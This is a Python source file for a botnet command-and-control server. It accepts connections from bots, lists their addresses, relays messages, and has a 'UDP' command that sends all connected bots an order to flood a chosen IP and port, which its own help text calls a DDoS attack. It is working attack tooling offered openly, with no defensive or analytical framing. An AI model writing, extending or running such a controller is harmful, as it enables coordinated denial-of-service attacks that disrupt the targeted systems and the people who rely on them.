import socket
import threading
import os
import pickle

# creates server socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 420))
sock.listen(1)

cons = []
adds = []

# listens for new connections and dedicates a thread to them
def listener():
    while True:
        c, a = sock.accept()
        if c != None:
            cons.append(c)
            adds.append(a)
            c = None

def check():
    for i in range(0, len(cons)):
        try:
            cons[i].send("Are you alive?".encode("utf-8"))
        except:
            cons.pop(i)
            adds.pop(i)

def send_all(command):
    for i in range(len(cons)):
        cons[i].send(command)

def userInterface():
    while True:
        print(">", end="")
        command = input().lower().split(" ")
        if command[0] == "help":
            print()
            print("ADDS           Shows a list of every connected ip address.")
            print("CLS            Clears command prompt.")
            print("CONS           Maximum number of connections.")
            print("EXIT           Exits server.")
            print("HELP           Shows list of commands.")
            print("MSG            Sends a costom message to all connections.")
            print("UDP            Starts a DDoS attack using UDP")
            print()
        elif command[0] == "cls":
            os.system("cls")
        elif command[0] == "exit":
            exit(0)
        elif command[0] == "adds":
            check()
            if len(adds) > 0:
                print(adds)
            else:
                print("There are no connections!", end="\n\n")
        elif command[0] == "msg":
            check()
            try:
                send_all(pickle.dumps((command[0], command[1])))
            except:
                print("MSG {message}", end="\n\n")
        elif command[0] == "udp":
            check()
            try:
                send_all(pickle.dumps((command[0], command[1], int(command[2]), command[3])))
            except:
                print("UDP {ip} {port} {message}", end="\n\n")

if __name__ == "__main__":
    threading.Thread(target=userInterface).start()
    threading.Thread(target=listener, daemon=True).start()